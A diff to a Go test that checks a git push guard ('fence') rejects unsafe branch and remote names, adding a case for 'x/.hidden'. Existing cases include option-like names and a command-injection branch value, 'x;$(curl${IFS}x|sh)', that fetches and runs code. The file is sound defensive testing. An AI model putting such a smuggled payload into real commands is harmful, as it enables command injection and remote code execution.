@@ -25,6 +25,7 @@ func TestTheExactPushNeedsTheRepositorysOwnBranch(t *testing.T) {
 		{name: "a branch like an option", change: func(s *fence.Spec) { s.Branch = "--force" }, err: fence.ErrNotPlain},
 		{name: "a branch with a colon", change: func(s *fence.Spec) { s.Branch = "a:main" }, err: fence.ErrNotPlain},
 		{name: "a branch that runs", change: func(s *fence.Spec) { s.Branch = "x;$(curl${IFS}x|sh)" }, err: fence.ErrNotPlain},
+		{name: "a branch git refuses", change: func(s *fence.Spec) { s.Branch = "x/.hidden" }, err: fence.ErrNotPlain},
 		{name: "a remote like an option", change: func(s *fence.Spec) { s.Remote = "-u" }, err: fence.ErrNotPlain},
 		{name: "no remote", change: func(s *fence.Spec) { s.Remote = "" }, err: fence.ErrNotPlain},
 	}
